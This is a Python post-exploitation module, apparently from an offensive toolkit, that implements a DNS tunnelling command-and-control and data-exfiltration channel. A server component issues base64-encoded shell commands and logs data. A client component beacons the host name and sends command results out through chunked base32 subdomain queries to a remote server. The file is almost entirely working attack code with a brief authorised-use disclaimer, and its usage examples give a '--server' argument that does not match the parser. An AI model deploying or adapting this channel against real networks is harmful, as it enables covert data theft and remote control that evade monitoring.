#!/usr/bin/env python3
"""
DNS Tunneling Covert Channel

Implements DNS-based data exfiltration and command-and-control channel.
Supports both server (authoritative DNS) and client (foothold) modes.
Uses subdomain encoding for data transmission and TXT records for responses.

Usage:
    # Server mode (authoritative DNS handler)
    python3 -m redshift_toolkit.postex.dns_tunnel --server --domain tunnel.example.com
    
    # Client mode (foothold side)
    python3 -m redshift_toolkit.postex.dns_tunnel --client --server 1.2.3.4 --domain tunnel.example.com

Author: Redshift Project — Module 19
License: MIT

DISCLAIMER: This tool is for authorized security testing only.
Unauthorized use against systems you don't own is illegal.
"""

from __future__ import annotations

import socket
import threading
import time
import base64
import binascii
import argparse
import sys
from typing import Dict, Optional
import struct
import json


# ANSI Color Constants
class Colors:
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    CYAN = "\033[96m"
    GREY = "\033[90m"
    BOLD = "\033[1m"
    RESET = "\033[0m"


def paint(text: str, color: str, use_color: bool = True) -> str:
    """Apply color if use_color is True."""
    if not use_color:
        return text
    return f"{color}{text}{Colors.RESET}"


class DNSPacket:
    """Simple DNS packet parser and builder."""
    
    def __init__(self, data: bytes = None):
        self.transaction_id = 0x1234
        self.flags = 0x0100  # Standard query
        self.questions = 1
        self.answer_rrs = 0
        self.authority_rrs = 0
        self.additional_rrs = 0
        self.query_name = ""
        self.query_type = 1  # A record
        self.query_class = 1  # IN
        self.raw_data = data
        
        if data:
            self._parse(data)
    
    def _parse(self, data: bytes) -> None:
        """Parse incoming DNS packet."""
        if len(data) < 12:
            return
        
        # Parse header
        header = struct.unpack(">HHHHHH", data[:12])
        self.transaction_id = header[0]
        self.flags = header[1]
        self.questions = header[2]
        self.answer_rrs = header[3]
        self.authority_rrs = header[4]
        self.additional_rrs = header[5]
        
        # Parse question section
        offset = 12
        domain_parts = []
        
        while offset < len(data):
            length = data[offset]
            if length == 0:
                offset += 1
                break
            if length > 63:
                break
            
            domain_part = data[offset + 1:offset + 1 + length].decode('ascii', errors='ignore')
            domain_parts.append(domain_part)
            offset += length + 1
        
        self.query_name = '.'.join(domain_parts)
        
        # Parse QTYPE and QCLASS
        if offset + 4 <= len(data):
            qtype_qclass = struct.unpack(">HH", data[offset:offset + 4])
            self.query_type = qtype_qclass[0]
            self.query_class = qtype_qclass[1]
    
    def build_response(self, answer_data: str, record_type: int = 16) -> bytes:
        """Build DNS response packet."""
        # Header
        response_flags = 0x8180  # Response, no error
        header = struct.pack(">HHHHHH", self.transaction_id, response_flags, 1, 1, 0, 0)
        
        # Question section (echo the original question)
        question = self._encode_domain_name(self.query_name)
        question += struct.pack(">HH", self.query_type, self.query_class)
        
        # Answer section
        answer = self._encode_domain_name(self.query_name)
        answer += struct.pack(">HH", record_type, self.query_class)  # Type (TXT=16), Class
        answer += struct.pack(">I", 300)  # TTL
        
        if record_type == 16:  # TXT record
            txt_data = answer_data.encode('ascii')
            answer += struct.pack(">H", len(txt_data) + 1)  # Data length
            answer += struct.pack("B", len(txt_data))  # TXT length
            answer += txt_data
        else:  # A record
            ip_parts = [int(x) for x in answer_data.split('.')]
            answer += struct.pack(">H", 4)  # Data length
            answer += struct.pack("BBBB", *ip_parts)
        
        return header + question + answer
    
    def _encode_domain_name(self, domain: str) -> bytes:
        """Encode domain name in DNS format."""
        result = b''
        for part in domain.split('.'):
            if part:
                part_bytes = part.encode('ascii')
                result += struct.pack("B", len(part_bytes)) + part_bytes
        result += b'\x00'  # Null terminator
        return result


class DNSServer:
    """DNS server for receiving tunneled data."""
    
    def __init__(self, domain: str, port: int = 53, use_color: bool = True):
        self.domain = domain.lower()
        self.port = port
        self.use_color = use_color
        self.socket = None
        self.running = False
        self.sessions: Dict[str, Dict] = {}
    
    def start(self) -> None:
        """Start the DNS server."""
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.socket.bind(('0.0.0.0', self.port))
            self.running = True
            
            print(paint(f"🚀 DNS tunnel server listening on port {self.port}", Colors.GREEN, self.use_color))
            print(paint(f"📡 Domain: {self.domain}", Colors.CYAN, self.use_color))
            print(paint("💡 Ready to receive tunneled data...", Colors.YELLOW, self.use_color))
            
            while self.running:
                try:
                    data, addr = self.socket.recvfrom(1024)
                    self._handle_query(data, addr)
                except socket.timeout:
                    continue
                except Exception as e:
                    print(paint(f"❌ Error handling query: {e}", Colors.RED, self.use_color))
        
        except Exception as e:
            print(paint(f"❌ Failed to start DNS server: {e}", Colors.RED, self.use_color))
            sys.exit(1)
    
    def _handle_query(self, data: bytes, addr: tuple) -> None:
        """Handle incoming DNS query."""
        packet = DNSPacket(data)
        
        if not packet.query_name.endswith(self.domain):
            return
        
        print(paint(f"🔍 Query from {addr[0]}: {packet.query_name}", Colors.CYAN, self.use_color))
        
        # Extract subdomain data
        subdomain = packet.query_name[:-len(self.domain) - 1]
        
        if subdomain.startswith('cmd.'):
            # Command request
            response_data = self._handle_command_request(subdomain[4:], addr[0])
        elif subdomain.startswith('data.'):
            # Data exfiltration
            self._handle_data_exfiltration(subdomain[5:], addr[0])
            response_data = "ack"
        else:
            # Unknown request
            response_data = "unknown"
        
        # Send DNS response
        try:
            response = packet.build_response(response_data)
            self.socket.sendto(response, addr)
        except Exception as e:
            print(paint(f"❌ Error sending response: {e}", Colors.RED, self.use_color))
    
    def _handle_command_request(self, encoded_data: str, client_ip: str) -> str:
        """Handle command request and return next command."""
        # In a real implementation, this would integrate with a C2 framework
        # For demo purposes, return a simple command
        commands = [
            "id",
            "hostname", 
            "whoami",
            "pwd",
            "ls -la"
        ]
        
        session = self.sessions.get(client_ip, {"command_index": 0})
        command_index = session.get("command_index", 0)
        
        if command_index < len(commands):
            cmd = commands[command_index]
            session["command_index"] = command_index + 1
            self.sessions[client_ip] = session
            
            print(paint(f"📤 Sending command to {client_ip}: {cmd}", Colors.YELLOW, self.use_color))
            return base64.b64encode(cmd.encode()).decode()
        else:
            return base64.b64encode(b"sleep 60").decode()
    
    def _handle_data_exfiltration(self, encoded_data: str, client_ip: str) -> None:
        """Handle exfiltrated data."""
        try:
            # Decode base32 encoded data (DNS-safe)
            decoded_data = base64.b32decode(encoded_data.upper() + '=' * (-len(encoded_data) % 8))
            data_str = decoded_data.decode('utf-8', errors='ignore')
            
            print(paint(f"📥 Data from {client_ip}: {data_str[:100]}{'...' if len(data_str) > 100 else ''}", 
                       Colors.GREEN, self.use_color))
            
            # Log to file
            with open(f"dns_tunnel_{client_ip}.log", "a") as f:
                f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {data_str}\n")
        
        except Exception as e:
            print(paint(f"❌ Error decoding data: {e}", Colors.RED, self.use_color))
    
    def stop(self) -> None:
        """Stop the DNS server."""
        self.running = False
        if self.socket:
            self.socket.close()


class DNSClient:
    """DNS client for tunneling data."""
    
    def __init__(self, server_ip: str, domain: str, use_color: bool = True):
        self.server_ip = server_ip
        self.domain = domain.lower()
        self.use_color = use_color
        self.session_id = binascii.hexlify(b'test')[:8].decode()
    
    def send_command_request(self) -> Optional[str]:
        """Request next command from C2."""
        try:
            # Create command request subdomain
            subdomain = f"cmd.{self.session_id}.{self.domain}"
            
            # Send DNS query
            response = self._send_dns_query(subdomain)
            
            if response:
                try:
                    command = base64.b64decode(response).decode()
                    print(paint(f"📨 Received command: {command}", Colors.CYAN, self.use_color))
                    return command
                except Exception:
                    return None
            
        except Exception as e:
            print(paint(f"❌ Error requesting command: {e}", Colors.RED, self.use_color))
        
        return None
    
    def exfiltrate_data(self, data: str) -> bool:
        """Exfiltrate data via DNS."""
        try:
            # Encode data in base32 (DNS-safe)
            encoded_data = base64.b32encode(data.encode()).decode().rstrip('=').lower()
            
            # Split into chunks if too long (DNS label limit is 63 characters)
            max_chunk_size = 50  # Leave room for session ID and prefixes
            
            for i in range(0, len(encoded_data), max_chunk_size):
                chunk = encoded_data[i:i + max_chunk_size]
                subdomain = f"data.{self.session_id}.{chunk}.{self.domain}"
                
                print(paint(f"📤 Exfiltrating chunk: {chunk[:20]}...", Colors.YELLOW, self.use_color))
                
                response = self._send_dns_query(subdomain)
                if not response:
                    return False
                
                time.sleep(1)  # Avoid flooding
            
            return True
        
        except Exception as e:
            print(paint(f"❌ Error exfiltrating data: {e}", Colors.RED, self.use_color))
            return False
    
    def _send_dns_query(self, domain: str) -> Optional[str]:
        """Send DNS query and return response."""
        try:
            # Create DNS query packet
            packet = DNSPacket()
            packet.query_name = domain
            packet.query_type = 16  # TXT record
            
            # Build query
            header = struct.pack(">HHHHHH", packet.transaction_id, packet.flags, 1, 0, 0, 0)
            question = packet._encode_domain_name(domain)
            question += struct.pack(">HH", packet.query_type, packet.query_class)
            query = header + question
            
            # Send query
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(5)
            
            sock.sendto(query, (self.server_ip, 53))
            response_data, _ = sock.recvfrom(1024)
            sock.close()
            
            # Parse response
            response_packet = DNSPacket(response_data)
            
            # Extract TXT record data (simplified parsing)
            if len(response_data) > 50:
                # Look for TXT record data in response
                for i in range(50, len(response_data) - 10):
                    if response_data[i] > 0 and response_data[i] < 100:
                        try:
                            txt_length = response_data[i]
                            txt_data = response_data[i + 1:i + 1 + txt_length].decode('ascii', errors='ignore')
                            if txt_data:
                                return txt_data
                        except:
                            continue
            
            return None
        
        except Exception as e:
            print(paint(f"❌ DNS query failed: {e}", Colors.RED, self.use_color))
            return None
    
    def run_client_loop(self) -> None:
        """Run client C2 loop."""
        print(paint(f"🚀 Starting DNS tunnel client", Colors.GREEN, self.use_color))
        print(paint(f"📡 Server: {self.server_ip}", Colors.CYAN, self.use_color))
        print(paint(f"📡 Domain: {self.domain}", Colors.CYAN, self.use_color))
        print(paint(f"🔑 Session ID: {self.session_id}", Colors.CYAN, self.use_color))
        
        # Initial beacon
        hostname = socket.gethostname()
        beacon_data = f"BEACON:{hostname}:{self.session_id}"
        self.exfiltrate_data(beacon_data)
        
        while True:
            try:
                # Request next command
                command = self.send_command_request()
                
                if command and command.strip():
                    print(paint(f"⚡ Executing: {command}", Colors.YELLOW, self.use_color))
                    
                    # Execute command (simplified - in real implementation, use subprocess)
                    if command.strip() in ['id', 'whoami', 'hostname', 'pwd']:
                        result = f"Mock result for: {command}"
                    else:
                        result = f"Command executed: {command}"
                    
                    # Exfiltrate result
                    result_data = f"RESULT:{command}:{result}"
                    self.exfiltrate_data(result_data)
                
                # Sleep between requests
                time.sleep(10)
                
            except KeyboardInterrupt:
                print(paint("\n❌ Client stopped", Colors.RED, self.use_color))
                break
            except Exception as e:
                print(paint(f"❌ Client error: {e}", Colors.RED, self.use_color))
                time.sleep(30)


def main():
    """Main function."""
    parser = argparse.ArgumentParser(
        description="DNS Tunneling Covert Channel",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
    # Server mode (requires privileged port binding)
    sudo python3 -m redshift_toolkit.postex.dns_tunnel --server --domain tunnel.example.com
    
    # Client mode
    python3 -m redshift_toolkit.postex.dns_tunnel --client --server 1.2.3.4 --domain tunnel.example.com
    
    # Custom port (server)
    python3 -m redshift_toolkit.postex.dns_tunnel --server --domain tunnel.example.com --port 5353

Note: 
    - Server mode requires DNS zone delegation to your server
    - Use non-standard port if you don't have root access
    - This is a proof-of-concept implementation
"""
    )
    
    parser.add_argument(
        "--server",
        action="store_true",
        help="Run in server mode (DNS authoritative server)"
    )
    parser.add_argument(
        "--client", 
        action="store_true",
        help="Run in client mode (foothold side)"
    )
    parser.add_argument(
        "--domain",
        required=True,
        help="Domain name for tunneling (e.g., tunnel.example.com)"
    )
    parser.add_argument(
        "--server-ip",
        dest="server_ip",
        help="DNS server IP (required for client mode)"
    )
    parser.add_argument(
        "--port",
        type=int,
        default=53,
        help="DNS server port (default: 53)"
    )
    parser.add_argument(
        "--no-color",
        action="store_true",
        help="Disable colored output"
    )
    
    args = parser.parse_args()
    use_color = not args.no_color
    
    # Validate arguments
    if not args.server and not args.client:
        print(paint("❌ Must specify either --server or --client mode", Colors.RED, use_color))
        sys.exit(1)
    
    if args.client and not args.server_ip:
        print(paint("❌ Client mode requires --server-ip", Colors.RED, use_color))
        sys.exit(1)
    
    print(paint("⚠️  DNS Tunneling Tool - For Authorized Testing Only", Colors.YELLOW, use_color))
    print(paint("📋 Ensure you have proper authorization before use", Colors.GREY, use_color))
    print()
    
    try:
        if args.server:
            server = DNSServer(args.domain, args.port, use_color)
            server.start()
        else:
            client = DNSClient(args.server_ip, args.domain, use_color)
            client.run_client_loop()
    
    except KeyboardInterrupt:
        print(paint("\n👋 DNS tunnel stopped", Colors.YELLOW, use_color))
    except Exception as e:
        print(paint(f"❌ Error: {e}", Colors.RED, use_color))
        sys.exit(1)


if __name__ == "__main__":
    main()
